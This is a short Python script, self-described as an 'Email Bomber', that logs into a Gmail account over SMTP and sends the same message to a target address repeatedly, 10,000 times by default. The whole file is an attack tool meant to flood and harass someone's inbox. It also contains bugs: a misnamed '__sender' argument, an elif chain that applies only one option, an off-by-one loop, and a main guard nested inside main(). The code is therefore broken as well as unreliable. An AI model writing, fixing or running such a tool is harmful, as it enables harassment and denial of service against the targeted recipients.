import smtplib
import argparse

def sendMail(sender , password, receiver, subject, msg, times):
    header ="From :{}\n".format(sender)
    header += "To :{}\n".format(receiver)
    header += "Subject :{}\n".format(subject)
    message = header + msg
    try:
        for n in range(1, times):
            server = smtplib.SMTP(host="smtp.gmail.com", port =587)
            server.starttls()
            server.login(sender, password)
            server.sendmail(from_addr=sender, to_addrs=receiver, msg=message)
            print("{} email sent ".format(n))
    except:
        print("Failed to send emails!")


def main():
    parser = argparse.ArgumentParser(description="Email Bomber")
    parser.add_argument("-f", "__sender", type=str, help="Email address for mail ONLY SUPPORTS GMAIL")
    parser.add_argument("-p", "--passwd", type=str, help="Password for the SENDERS email account")
    parser.add_argument("-t", "--to", type=str, help="Target email")
    parser.add_argument("-s", "--subject", type=str, help="Subject of email")
    parser.add_argument("-m", "--message", type=str, help="Message body")
    parser.add_argument("-n", "--times", type=int, help="Number of emails to be sent")
    args = parser.parse_args()

    if not args.sender or not args.passwd or not args.to:
        print("Fields not specified")
        exit()
    else:
        subject = "Email Bomb"
        msg = "Custom python Email Bomber <3 xD"
        times = 10000
        if args.subject:
            subject = args.subject
        elif args.message:
            msg=args.message
        elif args.times:
            times = args.times
        sendMail(args.sender, args.passwd, args.to, subject, msg, times)

    if __name__ == "__main__":
        main()